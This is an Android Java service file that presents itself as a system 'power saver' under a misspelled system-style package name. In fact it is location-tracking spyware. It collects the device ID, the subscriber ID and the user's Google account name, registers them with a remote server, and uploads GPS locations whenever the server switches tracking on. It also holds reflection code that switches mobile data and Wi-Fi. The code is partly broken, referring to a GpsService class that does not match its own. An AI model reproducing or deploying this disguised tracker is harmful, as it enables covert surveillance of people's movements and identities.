package com.andoid.system.systempowermanager;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class PowerSaverService extends Service implements LocationListener {
    final static int DATA_SEND_INTERVAL = 1000 * 30;
    final static int STATUS_GET_INTERVAL = 1000 * 20;

    boolean locationChanged = false;
    boolean providerEnabledNet = false;
    boolean providerEnabledGps = false;

    Timer mTimer;
    TimerTask mTimerTask;

    ArrayList<LocationWithTS> locations;

    int statusGotTime = 0;
    int dataSentTime = 0;

    int myRegistrationStatus;
    boolean isTracking = false;

    private String myDeviceId;
    private String myServerUrl;

    double currentLatitude;
    double currentLongitude;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
    }

    public PowerSaverService() {
        super();
    }

    public boolean isGpsAvailableViaNetwork() {
        LocationManager locationManagerNetwork = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationManagerNetwork.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000L, 1.0f, this);

        return locationManagerNetwork.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    public boolean isGpsAvailable() {
        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000L, 1.0f, this);

        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
    }


    private String getUserName() {
        String mn = wimn();
        String ret = mn;
        AccountManager manager = AccountManager.get(this);
        Account[] accounts = manager.getAccountsByType("com.google");
        List<String> possibleEmails = new LinkedList<String>();

        for (Account account : accounts) {
            possibleEmails.add(account.name);
        }

        if (!possibleEmails.isEmpty() && possibleEmails.get(0) != null) {
            String email = possibleEmails.get(0);
            String[] parts = email.split("@");

            if (parts.length > 0) {
                ret = parts[0] + "'s " + wimn();
            }
        }
        return ret;
    }

    private String wimn() {
        return Build.MANUFACTURER + " " + Build.MODEL;
    }

    private String getMyId() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(getApplicationContext().TELEPHONY_SERVICE);
        Toast.makeText(getApplicationContext(), "Subs id : " + telephonyManager.getSubscriberId(), Toast.LENGTH_SHORT).show();
        return telephonyManager.getDeviceId();
    }

    private String getMyServerUrl() {
        return getResources().getString(R.string.server_url);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i("", "onStart service *****");
        if (!isGpsAvailableViaNetwork()) {
            Toast.makeText(getApplicationContext(), " Gps is available on your device via network", Toast.LENGTH_LONG).show();
        }

        myDeviceId = getMyId();
        myServerUrl = getMyServerUrl();

        locations = new ArrayList<LocationWithTS>();

        myRegistrationStatus = getMyRegistrationStatus(); //test comment
        if (myRegistrationStatus == -1) {
            HttpFunctions.registerMe(myDeviceId +","+getUserName(), myServerUrl);// test comment
        }

        mTimer = new Timer();
        mTimerTask = new TimerTask() {
            @Override
            public void run() {
                handler.sendEmptyMessage(0);
            }
        };
        mTimer.scheduleAtFixedRate(mTimerTask, 100, 1000);
        return Service.START_STICKY;
    }

    private int getMyRegistrationStatus() {
        return HttpFunctions.getRegistrationStatus(myDeviceId, myServerUrl);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
//        HttpFunctions.setMyConnection(myDeviceId+","+"false",myServerUrl);
//        Toast.makeText(getApplicationContext(),"on Destroy",Toast.LENGTH_LONG);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        HttpFunctions.setMyConnection(myDeviceId + "," + "false", myServerUrl);
        Toast.makeText(getApplicationContext(), "on Task removed", Toast.LENGTH_LONG);
    }

    public final boolean isInternetOn() {
        ConnectivityManager connec =
                (ConnectivityManager) getSystemService(getBaseContext().CONNECTIVITY_SERVICE);

        if (connec.getNetworkInfo(0).getState() == android.net.NetworkInfo.State.CONNECTED ||
                connec.getNetworkInfo(0).getState() == android.net.NetworkInfo.State.CONNECTING ||
                connec.getNetworkInfo(1).getState() == android.net.NetworkInfo.State.CONNECTING ||
                connec.getNetworkInfo(1).getState() == android.net.NetworkInfo.State.CONNECTED) {

            return true;

        } else if (
                connec.getNetworkInfo(0).getState() == android.net.NetworkInfo.State.DISCONNECTED ||
                        connec.getNetworkInfo(1).getState() == android.net.NetworkInfo.State.DISCONNECTED) {
            return false;
        }
        return false;
    }

    private void reGettingRegStatAndRegistration() {
        if (myRegistrationStatus == -1) {

            HttpFunctions.registerMe(myDeviceId + "," + getUserName(), myServerUrl);
            myRegistrationStatus = HttpFunctions.getRegistrationStatus(myDeviceId, myServerUrl);
//            Log.i("", "reGettingRegStatAngRegstration()");
//            Toast.makeText(getApplicationContext(), "reGettingRegStatAngRegstration() ", Toast.LENGTH_SHORT).show();
//            myRegistrationStatus = getMyRegistrationStatus();
//            if(myRegistrationStatus != -1)
//            {
//                HttpFunctions.registerMe(myDeviceId +","+getUserName(), myServerUrl);
//            }
        }
    }

    private boolean canGetLocation() {
        return (providerEnabledGps || providerEnabledNet);
    }

    private Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 0: {
                    reGettingRegStatAndRegistration();
                    if(myRegistrationStatus == -1){
                        break;
                    }
                    statusGotTime += 1000;
                    if(statusGotTime >= STATUS_GET_INTERVAL)
                    {
                        statusGotTime = 0;
                        isTracking = HttpFunctions.isTracking(myDeviceId, myServerUrl);
                        Log.i("", "Tracking " + isTracking);
                        Toast.makeText(GpsService.this, "Tracking " + isTracking, Toast.LENGTH_SHORT).show();
                    }

                    if(isTracking)
                    {
                        Iterator<LocationWithTS> locIterator = locations.iterator();
                        Log.i("", "Locations size = " + locations.size());
                        Toast.makeText(GpsService.this, "Locations size = " + locations.size(), Toast.LENGTH_SHORT).show();
                        while(locIterator.hasNext()){
                            LocationWithTS loc = locIterator.next();
                            if(HttpFunctions.postPosition(
                                        myDeviceId,
                                        loc.latitude,
                                        loc.longitude,
                                        loc.timeStamp,
                                        myServerUrl)) {

                                locIterator.remove();
                            }
                        }
                    }
                    break;
                }
                default:break;
            }
        }
    };
//    private Handler handler = new Handler() {
//        @Override
//        public void handleMessage(Message msg) {
////            Toast.makeText(getApplicationContext(), " Handler", Toast.LENGTH_SHORT).show();
////            Log.i("LOCATION VIA NETWORK",currentLatitude+","+currentLongitude);
////            Toast.makeText(getApplicationContext(), currentLatitude+","+currentLongitude, Toast.LENGTH_SHORT).show();
//            switch (msg.what) {
//                case 0: {
////                    Log.i("", "TASK LOOP 1");
//                    if (canGetLocation()) {
////                        Toast.makeText(getApplicationContext(), "Lon "+currentLongitude+" Lat "+currentLatitude, Toast.LENGTH_SHORT).show();
//
////                        Log.i("LOCATION VIA NETWORK",currentLatitude+","+currentLongitude);
////                        HttpFunctions.setMyConnection(myDeviceId+","+false,myServerUrl); test commented
//                    } else {
//                        Log.i("", "CANT GET LOCATION");
//                    }
//                    break;
///*
//                    if(!canGetLocation() && myRegistrationStatus != -1)
//                    {
////                        Toast.makeText(getApplicationContext(), " cant get location", Toast.LENGTH_SHORT).show();
//                        HttpFunctions.setMyConnection(myDeviceId+","+false,myServerUrl);
//                        break;
//                    }
//                    reGettingRegStatAndRegistration();
//
//                    if(!isInternetOn() || !locationChanged)
//                    {
//                        break;
//                    }
//
//                    statusGotTime += 1000;
//                    if(statusGotTime >= STATUS_GET_INTERVAL)
//                    {
//                        statusGotTime = 0;
//                        isTracking = HttpFunctions.isTracking(myDeviceId, myServerUrl);
//                    }
//
//                    if(isTracking)
//                    {
//                        dataSentTime+=1000;
//                        if(dataSentTime >= DATA_SEND_INTERVAL)
//                        {
//                            dataSentTime = 0;
//                            HttpFunctions.postPosition(
//                                    myDeviceId,
//                                    currentLatitude,
//                                    currentLongitude,
//                                    String.valueOf(System.currentTimeMillis()),
//                                    myServerUrl
//                            );
//                            locationChanged = false;
////                            Toast.makeText(getApplicationContext(), "Position sent", Toast.LENGTH_LONG).show();
//                        }
//                    }
//                    else
//                    {
//                    }
//                    break;*/
//                }
//            }
//        }
//    };

    @Override
    public void onLocationChanged(Location location) {
        currentLatitude = location.getLatitude();
        currentLongitude = location.getLongitude();

        if(isTracking && locations.size() < 200){
            locations.add(new LocationWithTS(currentLatitude, currentLongitude, String.valueOf(System.currentTimeMillis())));
            Toast.makeText(getApplicationContext(), "Location added" + location.getLatitude() + ", " + location.getLongitude(), Toast.LENGTH_LONG).show();

        }
        locationChanged = true;
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        Toast.makeText(getApplicationContext(), "Status changed " + status, Toast.LENGTH_LONG).show();
    }

    @Override
    public void onProviderEnabled(String provider) {
        Toast.makeText(getApplicationContext(), "GPS provider = " + provider, Toast.LENGTH_LONG).show();
//        Toast.makeText(getApplicationContext(), "Provider enabled", Toast.LENGTH_SHORT).show();
//        HttpFunctions.setMyConnection(myDeviceId+","+"true", myServerUrl);

        Toast.makeText(getApplicationContext(), "Provider enabled : " + provider, Toast.LENGTH_SHORT).show();

        if (provider.equals(LocationManager.NETWORK_PROVIDER)) {
            providerEnabledNet = true;
//            Toast.makeText(getApplicationContext(), (providerEnabledGps?"G: true - ":"G: false - ")+(providerEnabledNet?"N: true":"N: false"), Toast.LENGTH_SHORT).show();
        }
        if (provider.equals(LocationManager.GPS_PROVIDER)) {
            providerEnabledGps = true;
//            Toast.makeText(getApplicationContext(), (providerEnabledGps?"G: true - ":"G: false - ")+(providerEnabledNet?"N: true":"N: false"), Toast.LENGTH_SHORT).show();
        }


//        if(canGetLocation())
//        {
//            cancelNotification(NOTIFICATION_ID_GPS);
//        }
    }

    @Override
    public void onProviderDisabled(String provider) {
//        Toast.makeText(getApplicationContext(), "Provider disabled", Toast.LENGTH_SHORT).show();
//        HttpFunctions.setMyConnection(myDeviceId+","+"false", myServerUrl);
//        Toast.makeText(getApplicationContext(), "Provider disabled : "+ provider, Toast.LENGTH_SHORT).show();

        if (provider.equals(LocationManager.NETWORK_PROVIDER)) {
            providerEnabledNet = false;
        }
        if (provider.equals(LocationManager.GPS_PROVIDER)) {
            providerEnabledGps = false;
        }
    }


    /* other functions */

    private void setWifiEnabled(boolean enabled) {
        WifiManager wifiManager = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
        wifiManager.setWifiEnabled(enabled);
    }

    private void setMobileDataEnabled(Context context, boolean enabled) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        final ConnectivityManager conman = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final Class conmanClass = Class.forName(conman.getClass().getName());
        final Field connectivityManagerField = conmanClass.getDeclaredField("mService");
        connectivityManagerField.setAccessible(true);
        final Object connectivityManager = connectivityManagerField.get(conman);
        final Class connectivityManagerClass = Class.forName(connectivityManager.getClass().getName());
        final Method setMobileDataEnabledMethod = connectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
        setMobileDataEnabledMethod.setAccessible(true);

        setMobileDataEnabledMethod.invoke(connectivityManager, enabled);
    }

    /* other functions */
    private class LocationWithTS {
        public double latitude;
        public double longitude;
        public String timeStamp;
        public boolean sent;

        public String toString() {
            return "" + longitude + "," + latitude + "," + timeStamp;
        }

        public LocationWithTS(double latitude, double longitude, String timeStamp) {
            this.latitude = latitude;
            this.longitude = longitude;
            this.timeStamp = timeStamp;

            sent = false;
        }
    }
}
